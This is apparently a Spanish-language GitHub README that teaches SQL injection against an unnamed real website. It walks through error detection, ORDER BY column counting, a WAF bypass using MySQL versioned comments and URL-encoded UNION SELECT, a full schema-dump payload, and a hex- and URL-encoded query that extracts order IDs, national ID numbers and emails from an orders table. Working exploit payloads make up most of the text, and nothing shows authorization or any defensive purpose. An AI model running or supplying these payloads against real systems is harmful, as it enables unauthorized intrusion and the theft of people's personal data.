# SQLi-WAF-bypass
Bypass from 406 status code to 200 OK

Esto no suele ser muy comun, pero voy a enseñar como explotarlo, que payloads usar, como dumpear toda la información etc...

Primero debemos encontrar un target por privacidad no voy a enseñar el enlace de la pagina.

Si intentamos provocar un error en la query podremos ver que nos devuelve blank page en la pagina, por lo tanto es vulnerable a error-based SQLi.

En mi caso he probado una comilla simple (').

![image](https://github.com/user-attachments/assets/2950abd7-39cd-442d-b14f-88d2975e79c4)

Y la pagina nos devuelve lo siguiente:

![image](https://github.com/user-attachments/assets/40f92814-2329-445d-a83e-af95b4f812b1)

Una vez sabemos esto voy a proceder a ver si es vulnerable a ORDER BY.

Y es vulnerable, en este caso la pagina dispone de 14 columnas.

![image](https://github.com/user-attachments/assets/d14488d5-47d3-478b-b671-3c177410aed5)

Una vez tenemos las columnas procedo a hacer UNION SELECT. Pero veremos que al hacer el union nos devuelve code status 406 (not acceptable)

![image](https://github.com/user-attachments/assets/8cfac83a-d67b-4361-bf74-bfdbc5b7c09a)

Para bypassear esta restricción usaremos el siguiente payload: /*!50000%55nIoN*/ /*!50000%53eLeCt*/

Y veremos que ahora nos carga la pagina.

![image](https://github.com/user-attachments/assets/926087d7-5bb9-4e6a-98cf-a1836c1f974f)

Pero no encontraremos ninguna columna para inyectar, para eso deberemos añadir el "-" en el id= por ejemplo: https://"dominio"/menu.php?id=-7' /*!50000%55nIoN*/ /*!50000%53eLeCt*/ 1,2,3,4,5,6,7,8,9,10,11,12,13,14-- -

Una vez hecho podremos ver el número 2 que se refiere a la columna 2 de nuestro UNION, por lo tanto debemos poner nuestro payload ahí para poder extraer información.

![image](https://github.com/user-attachments/assets/32cf0363-5a71-4e39-9a78-302d66a08b2b)

Para dumpear la version,usuario,nombre de la base de datos, columnas, tablas etc... Todo en uno he usado este payload:

concat/*!(unhex(hex(concat/*!(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,unhex(hex(concat/*!(0x3c63656e7465723e3c666f6e7420636f6c6f723d7265642073697a653d343e3c623e3a3a207e7472306a416e2a2044756d7020496e204f6e652053686f74205175657279203c666f6e7420636f6c6f723d626c75653e28574146204279706173736564203a2d20207620312e30293c2f666f6e743e203c2f666f6e743e3c2f63656e7465723e3c2f623e))),0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,version(),0x7e20,@@version_comment,0x3c62723e5072696d617279204461746162617365203a3a20,@d:=database(),0x3c62723e44617461626173652055736572203a3a20,user(),(/*!12345selEcT*/(@x)/*!from*/(/*!12345selEcT*/(@x:=0x00),(@r:=0),(@running_number:=0),(@tbl:=0x00),(/*!12345selEcT*/(0) from(information_schema./**/columns)where(table_schema=database()) and(0x00)in(@x:=Concat/*!(@x, 0x3c62723e, if( (@tbl!=table_name), Concat/*!(0x3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@r:=@r%2b1, 2, 0x30),0x2e203c2f666f6e743e,@tbl:=table_name,0x203c666f6e7420636f6c6f723d677265656e3e3a3a204461746162617365203a3a203c666f6e7420636f6c6f723d626c61636b3e28,database(),0x293c2f666f6e743e3c2f666f6e743e,0x3c2f666f6e743e,0x3c62723e), 0x00),0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@running_number:=@running_number%2b1,3,0x30),0x2e20,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d7265643e,column_name,0x3c2f666f6e743e))))x)))))*/

Este payload esta hecho por: tr0jan WAF

En este caso se vería así:
![image](https://github.com/user-attachments/assets/8b701d24-0d54-47e8-ac69-5b1a22193aa4)

Seguidamente para dumpear deberíamos añadir el nombre de la base de datos, el nombre de la tabla y las columnas a dumpear:

En este caso el paylaod quedaría asi:

https://"dominio"/menu.php?id=-7' /*!50000%55nIoN*/ /*!50000%53eLeCt*/ 1,(SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)FROM(nombrebasededatos.pedidos)WHERE(@x)IN(@x:=CONCAT(0x20,@x,id_pedido,0x3a,dni_pedido,0x3a,email_pedido,0x3c62723e))))x),3,4,5,6,7,8,9,10,11,12,13,14-- -

Pero si lo ejecutamos nos dará error ya que el WAF elimina las setencias como WHERE, SELECT, FROM, CONCAT etc...

![image](https://github.com/user-attachments/assets/129ca0be-4734-4de8-b48a-eded50e6a2ae)


Por lo tanto tenemos que hard URL encodear todo el payload.

Quedando el payload así:
https://"dominio"/menu.php?id=-7' /*!50000%55nIoN*/ /*!50000%53eLeCt*/ 1,%28%53%45%4c%45%43%54%28%40%78%29%46%52%4f%4d%28%53%45%4c%45%43%54%28%40%78%3a%3d%30%78%30%30%29%20%2c%28%53%45%4c%45%43%54%28%40%78%29%46%52%4f%4d%28%28%6e%6f%6d%62%72%65%62%61%73%65%64%65%64%61%74%6f%73%29%2e%70%65%64%69%64%6f%73%29%57%48%45%52%45%28%40%78%29%49%4e%28%40%78%3a%3d%43%4f%4e%43%41%54%28%30%78%32%30%2c%40%78%2c%69%64%5f%70%65%64%69%64%6f%2c%30%78%33%61%2c%64%6e%69%5f%70%65%64%69%64%6f%2c%30%78%33%61%2c%65%6d%61%69%6c%5f%70%65%64%69%64%6f%2c%30%78%33%63%36%32%37%32%33%65%29%29%29%29%78%29,3,4,5,6,7,8,9,10,11,12,13,14-- -

![image](https://github.com/user-attachments/assets/2d8c15cd-ea09-45a5-9133-6f54e5330237)

Y esto sería todo, perdonad mi edición de Paint.
